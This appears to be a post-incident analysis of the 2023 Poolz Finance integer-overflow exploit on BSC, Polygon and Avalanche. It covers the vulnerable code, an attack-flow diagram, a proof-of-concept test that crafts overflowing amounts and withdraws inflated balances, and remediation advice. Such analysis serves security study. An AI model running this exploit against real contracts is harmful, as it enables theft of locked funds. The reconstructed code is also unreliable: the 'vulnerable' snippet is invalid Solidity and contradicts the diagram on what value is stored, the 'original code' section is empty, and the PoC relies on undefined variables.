# Poolz Finance — Integer Overflow Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2023-03-15 |
| **Protocol** | Poolz Finance |
| **Chain** | BSC / Polygon / Avalanche |
| **Loss** | ~665K USD |
| **Attacker** | Unknown |
| **Attack Tx** | Occurred across multiple chains |
| **Vulnerable Contract** | Poolz LockedDeal Contract |
| **Root Cause** | Integer overflow due to missing `SafeMath` in Solidity 0.6.x |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-03/poolz_exp.sol) |

---
## 1. Vulnerability Overview

Poolz Finance's LockedDeal contract was written in Solidity 0.6.x and did not use the `SafeMath` library for certain arithmetic operations. An attacker passed specially crafted parameters to the `CreateMassDeal()` function to trigger an integer overflow, allowing withdrawal of far more tokens than originally locked upon unlock.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code (Solidity 0.6.x, SafeMath not used)
function CreateMassDeal(
    address[] calldata _to,
    uint256[] calldata _amount,
    uint256[] calldata _startTime,
    uint256[] calldata _finishTime,
    address _tokenAddress
) external payable {
    for (uint256 i = 0; i < _to.length; ++i) {
        // ❌ totalAmount calculation susceptible to overflow
        uint256 totalAmount += _amount[i];  // overflow → very small value
        // In practice, creates a lock with a tiny token amount for a huge amount value
    }
    // ❌ Lock created without validation
    _createDeal(_to, totalAmount, _startTime, _finishTime, _tokenAddress);
}

// On withdrawal, the overflowed large amount enables mass withdrawal
function withdraw(uint256 dealId) external {
    // amount is much larger than actually locked due to overflow
    uint256 withdrawAmount = deals[dealId].amount;
    token.transfer(msg.sender, withdrawAmount);  // mass withdrawal
}

// ✅ Fix: Use SafeMath or upgrade to Solidity 0.8.x or above
// Solidity 0.8.x automatically reverts on overflow
```

### On-chain Original Code

Source: Bytecode decompilation

```solidity
// Root cause: Integer overflow due to missing `SafeMath` in Solidity 0.6.x
// Source code unverified — based on bytecode analysis
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─1─▶ CreateMassDeal(
  │         amounts=[MAX_UINT - X, Y, ...]  // overflow-inducing values
  │     )
  │       totalAmount = (MAX_UINT - X) + Y = small value (overflow)
  │       actual tokens required = overflowed small value
  │
  ├─2─▶ Deposit only a small amount of tokens
  │       However, deal.amount is stored as the large pre-overflow value
  │
  ├─3─▶ Lock period elapses (or set to 0)
  │
  ├─4─▶ withdraw(dealId)
  │       deal.amount = very large value → mass withdrawal
  │
  └─5─▶ Sell stolen tokens → profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
function testExploit() public {
    // Construct amount array to trigger overflow
    uint256[] memory amounts = new uint256[](2);
    // MAX_UINT256 - X: adding the two values causes overflow
    amounts[0] = type(uint256).max - smallValue + 1;
    amounts[1] = smallValue;
    // amounts[0] + amounts[1] = overflow → 0 (or very small value)

    address[] memory recipients = new address[](2);
    recipients[0] = address(this);
    recipients[1] = address(this);

    // Create a large deal with a small token deposit
    token.approve(address(poolz), smallDeposit);
    poolz.CreateMassDeal(recipients, amounts, startTimes, finishTimes, address(token));

    // Withdraw large amount after lock period ends
    vm.warp(block.timestamp + 1);  // simulate time passing
    poolz.withdraw(dealId);  // withdraw using overflowed large amount
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Integer Overflow |
| **Attack Vector** | Overflow triggered via malicious parameters |
| **Impact Scope** | Entire LockedDeal contract balance |
| **DASP Classification** | Integer Overflow |
| **CWE** | CWE-190: Integer Overflow |

## 6. Remediation Recommendations

1. **Use Solidity 0.8.x or above**: Leverage built-in overflow checks.
2. **Apply SafeMath**: Use SafeMath for all arithmetic operations when on 0.6.x or below.
3. **Input range validation**: Verify that the sum of `_amount` values matches the actual deposited token amount.

## 7. Lessons Learned

- The occurrence of an integer overflow as late as 2023 demonstrates the risks inherent in legacy codebases.
- Multi-chain deployment across BSC, Polygon, and Avalanche means the same vulnerability can be exploited simultaneously across multiple chains.
- When upgrading contracts, the Solidity version must also be updated to the latest.